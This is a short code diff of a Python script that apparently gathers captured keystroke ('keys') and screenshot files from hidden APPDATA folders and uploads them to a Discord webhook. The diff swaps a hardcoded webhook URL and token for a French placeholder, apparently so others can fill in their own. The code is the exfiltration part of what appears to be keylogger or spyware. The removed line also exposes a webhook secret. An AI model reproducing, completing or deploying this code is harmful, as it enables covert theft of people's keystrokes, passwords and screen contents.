@@ -5,7 +5,7 @@ import requests
 appdata = os.getenv("APPDATA")
 keys_path = os.path.join(appdata, ".kfaction", "cache", "keys")
 screenshots_path = os.path.join(appdata, ".kfaction", "screenshots")
-webhook_url = "https://discord.com/api/webhooks/1071833273577263224/16m4zIqI2u8HjGAdgNpPj_uiuafCmsg7g8CMzoTKh86yJMXHJRxOD3QZqeG1GOJHIfo1"
+webhook_url = "VOTRE WEBHOOK DISCORD"
 
 def send_webhook(file_path, webhook_url):
     with open(file_path, "rb") as f:
